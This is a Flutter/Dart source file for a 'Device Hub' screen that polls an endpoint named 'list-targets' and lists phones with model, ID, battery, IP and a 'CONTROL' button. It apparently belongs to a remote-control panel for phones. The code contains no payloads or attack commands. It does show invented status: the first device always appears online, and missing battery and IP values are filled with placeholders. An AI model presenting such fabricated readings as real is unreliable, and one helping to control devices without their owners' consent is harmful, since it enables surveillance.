import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'dart:async';
import 'api_config.dart';
import 'control_panel.dart';

// ─── Palette (sama dengan Tools Page) ─────────────────────────────────────
class _C {
  static const bg        = Color(0xFF06131A);
  static const surface   = Color(0xFF0C1D26);
  static const card      = Color(0xFF122833);
  static const cardInner = Color(0xFF16313D);
  static const border    = Color(0xFF1E4654);
  static const borderLit = Color(0xFF2B5D6A);
  static const steel     = Color(0xFF2FA9B8);
  static const blueMid   = Color(0xFF39C7D9);
  static const blueLight = Color(0xFF5EEFFF);
  static const chrome    = Color(0xFF7CF7ED);
  static const frost     = Color(0xFFB7FFF7);
  static const red       = Color(0xFF4CD4D8);
  static const amber     = Color(0xFF79E6E6);
  static const green     = Color(0xFF55D6C2);
  static const purple    = Color(0xFF67DDE2);
  static const pink      = Color(0xFF7CE6F0);
  static const teal      = Color(0xFF5EEFFF);
  static const blue      = Color(0xFF39C7D9);
  static const text      = Color(0xFFEFFFFF);
  static const textSub   = Color(0xFFA8D7DF);
  static const textDim   = Color(0xFF6F95A0);
  static const white     = Color(0xFFFFFFFF);
}

class DeviceDashboardPage extends StatefulWidget {
  const DeviceDashboardPage({super.key});

  @override
  State<DeviceDashboardPage> createState() => _DeviceDashboardPageState();
}

class _DeviceDashboardPageState extends State<DeviceDashboardPage> {
  List<dynamic> _devices = [];
  bool _isLoading = true;
  Timer? _timer;

  @override
  void initState() {
    super.initState();
    _fetchDevices();
    _timer = Timer.periodic(const Duration(seconds: 10), (timer) => _fetchDevices());
  }

  @override
  void dispose() {
    _timer?.cancel();
    super.dispose();
  }

  Future<void> _fetchDevices() async {
    try {
      final response = await http.get(
        Uri.parse("$baseUrl/api/list-targets"),
      );

      if (response.statusCode == 200) {
        if (mounted) {
          setState(() {
            _devices = jsonDecode(response.body);
            _isLoading = false;
          });
        }
      }
    } catch (e) {
      debugPrint("Error fetching devices: $e");
    }
  }

  @override
  Widget build(BuildContext context) {
    int activeCount = _devices.isNotEmpty ? _devices.length : 0;

    return Scaffold(
      backgroundColor: _C.bg,
      body: SafeArea(
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            // Header dengan tombol back
            _buildHeader(activeCount),
            
            const SizedBox(height: 16),
            
            // Subheader
            _buildSubHeader(),
            
            const SizedBox(height: 12),
            
            // Grid Data
            Expanded(
              child: _isLoading 
                ? const Center(child: CircularProgressIndicator(color: _C.blueLight))
                : _devices.isEmpty 
                  ? Center(
                      child: Column(
                        mainAxisAlignment: MainAxisAlignment.center,
                        children: [
                          Icon(Icons.devices_rounded, color: _C.textSub, size: 48),
                          const SizedBox(height: 12),
                          Text(
                            "NO DEVICES FOUND",
                            style: TextStyle(color: _C.textSub, fontWeight: FontWeight.bold, letterSpacing: 2),
                          ),
                        ],
                      ),
                    )
                  : GridView.builder(
                      padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
                      gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
                        crossAxisCount: 2,
                        crossAxisSpacing: 14,
                        mainAxisSpacing: 14,
                        childAspectRatio: 0.85,
                      ),
                      itemCount: _devices.length,
                      itemBuilder: (context, index) => _buildDeviceCard(_devices[index], index),
                    ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildHeader(int activeCount) {
    return Container(
      padding: const EdgeInsets.fromLTRB(20, 16, 20, 16),
      decoration: BoxDecoration(
        gradient: LinearGradient(
          colors: [_C.surface, _C.bg],
          begin: Alignment.topCenter,
          end: Alignment.bottomCenter,
        ),
        borderRadius: const BorderRadius.vertical(bottom: Radius.circular(24)),
        border: Border(bottom: BorderSide(color: _C.border.withOpacity(0.5))),
      ),
      child: Row(
        children: [
          // Tombol Back
          GestureDetector(
            onTap: () => Navigator.pop(context),
            child: Container(
              width: 44,
              height: 44,
              decoration: BoxDecoration(
                color: _C.cardInner.withOpacity(0.8),
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: _C.border),
              ),
              child: const Icon(Icons.arrow_back_ios_rounded, color: _C.blueLight, size: 20),
            ),
          ),
          const SizedBox(width: 16),
          
          // Logo / Title
          Container(
            padding: const EdgeInsets.all(10),
            decoration: BoxDecoration(
              gradient: const LinearGradient(colors: [_C.steel, _C.blueMid]),
              borderRadius: BorderRadius.circular(14),
            ),
            child: const Icon(Icons.devices_rounded, color: Colors.white, size: 22),
          ),
          const SizedBox(width: 12),
          
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                const Text(
                  "DEVICE HUB",
                  style: TextStyle(color: _C.text, fontSize: 18, fontWeight: FontWeight.bold, letterSpacing: 1),
                ),
                Text(
                  "Control Center",
                  style: TextStyle(color: _C.textSub, fontSize: 10),
                ),
              ],
            ),
          ),
          
          // Stats
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 8),
            decoration: BoxDecoration(
              color: _C.cardInner,
              borderRadius: BorderRadius.circular(20),
              border: Border.all(color: _C.border),
            ),
            child: Column(
              children: [
                Text(
                  "$activeCount",
                  style: const TextStyle(color: _C.blueLight, fontSize: 20, fontWeight: FontWeight.bold),
                ),
                const Text(
                  "ACTIVE",
                  style: TextStyle(color: _C.textSub, fontSize: 8, letterSpacing: 1),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildSubHeader() {
    return Padding(
      padding: const EdgeInsets.symmetric(horizontal: 20),
      child: Row(
        mainAxisAlignment: MainAxisAlignment.spaceBetween,
        children: [
          Row(
            children: [
              Container(
                width: 3,
                height: 16,
                decoration: BoxDecoration(
                  color: _C.blueLight,
                  borderRadius: BorderRadius.circular(2),
                ),
              ),
              const SizedBox(width: 8),
              Text(
                "CONNECTED DEVICES",
                style: TextStyle(
                  color: _C.text,
                  fontSize: 12,
                  fontWeight: FontWeight.bold,
                  letterSpacing: 1.5,
                ),
              ),
            ],
          ),
          Text(
            "${_devices.length} TOTAL",
            style: TextStyle(color: _C.textSub, fontSize: 10),
          ),
        ],
      ),
    );
  }

  Widget _buildDeviceCard(dynamic device, int index) {
    // Status berdasarkan index atau data dari device
    bool isOnline = device['status'] == 'online' || index == 0;
    Color statusColor = isOnline ? _C.green : _C.red;
    String statusText = isOnline ? "ONLINE" : "OFFLINE";
    
    return GestureDetector(
      onTap: () {
  Navigator.push(
    context,
    MaterialPageRoute(
      builder: (context) => const ControlCenterPage(),
      settings: RouteSettings(arguments: device),
    ),
  );
},
      child: Container(
        padding: const EdgeInsets.all(12),
        decoration: BoxDecoration(
          gradient: LinearGradient(
            colors: [_C.card, _C.cardInner],
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
          ),
          borderRadius: BorderRadius.circular(20),
          border: Border.all(
            color: isOnline ? _C.blueMid.withOpacity(0.5) : _C.border,
            width: 1.5,
          ),
          boxShadow: [
            BoxShadow(
              color: isOnline ? _C.blueMid.withOpacity(0.1) : Colors.transparent,
              blurRadius: 12,
              offset: const Offset(0, 4),
            ),
          ],
        ),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            // Header: Icon + Status
            Row(
              mainAxisAlignment: MainAxisAlignment.spaceBetween,
              children: [
                Container(
                  padding: const EdgeInsets.all(8),
                  decoration: BoxDecoration(
                    color: isOnline ? _C.blueMid.withOpacity(0.15) : _C.cardInner,
                    borderRadius: BorderRadius.circular(12),
                  ),
                  child: Icon(
                    Icons.phone_android_rounded,
                    color: isOnline ? _C.blueLight : _C.textSub,
                    size: 18,
                  ),
                ),
                Container(
                  padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
                  decoration: BoxDecoration(
                    color: statusColor.withOpacity(0.1),
                    borderRadius: BorderRadius.circular(20),
                    border: Border.all(color: statusColor.withOpacity(0.3)),
                  ),
                  child: Row(
                    children: [
                      Container(
                        width: 6,
                        height: 6,
                        decoration: BoxDecoration(
                          color: statusColor,
                          shape: BoxShape.circle,
                          boxShadow: [
                            BoxShadow(color: statusColor, blurRadius: 4),
                          ],
                        ),
                      ),
                      const SizedBox(width: 4),
                      Text(
                        statusText,
                        style: TextStyle(
                          color: statusColor,
                          fontSize: 7,
                          fontWeight: FontWeight.bold,
                        ),
                      ),
                    ],
                  ),
                ),
              ],
            ),
            
            const Spacer(),
            
            // Device Name
            Text(
              device['model'] ?? "Unknown Device",
              style: const TextStyle(
                color: _C.text,
                fontSize: 13,
                fontWeight: FontWeight.bold,
              ),
              maxLines: 1,
              overflow: TextOverflow.ellipsis,
            ),
            const SizedBox(height: 4),
            
            // Device ID
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
              decoration: BoxDecoration(
                color: _C.cardInner,
                borderRadius: BorderRadius.circular(4),
              ),
              child: Text(
                device['id'] ?? "NO-ID",
                style: TextStyle(color: _C.textSub, fontSize: 8),
                maxLines: 1,
                overflow: TextOverflow.ellipsis,
              ),
            ),
            
            const Spacer(),
            
            // Battery & IP Row
            Row(
              children: [
                Icon(Icons.battery_charging_full_rounded, color: _C.textSub, size: 12),
                const SizedBox(width: 4),
                Text(
                  "${device['battery'] ?? '100'}%",
                  style: const TextStyle(color: _C.text, fontSize: 10, fontWeight: FontWeight.w500),
                ),
                const SizedBox(width: 12),
                Icon(Icons.wifi_rounded, color: _C.textSub, size: 12),
                const SizedBox(width: 4),
                Expanded(
                  child: Text(
                    device['ip'] ?? "192.168.1.1",
                    style: TextStyle(color: _C.textSub, fontSize: 9),
                    maxLines: 1,
                    overflow: TextOverflow.ellipsis,
                  ),
                ),
              ],
            ),
            
            const SizedBox(height: 8),
            
            // Access Button
            Container(
              width: double.infinity,
              padding: const EdgeInsets.symmetric(vertical: 6),
              decoration: BoxDecoration(
                gradient: isOnline
                    ? const LinearGradient(colors: [_C.steel, _C.blueMid])
                    : null,
                color: isOnline ? null : _C.cardInner,
                borderRadius: BorderRadius.circular(10),
                border: Border.all(
                  color: isOnline ? _C.blueLight : _C.border,
                ),
              ),
              child: Row(
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  Text(
                    "CONTROL",
                    style: TextStyle(
                      color: isOnline ? Colors.white : _C.textSub,
                      fontSize: 9,
                      fontWeight: FontWeight.bold,
                      letterSpacing: 1,
                    ),
                  ),
                  const SizedBox(width: 4),
                  Icon(
                    Icons.arrow_forward_rounded,
                    color: isOnline ? Colors.white : _C.textSub,
                    size: 10,
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }
}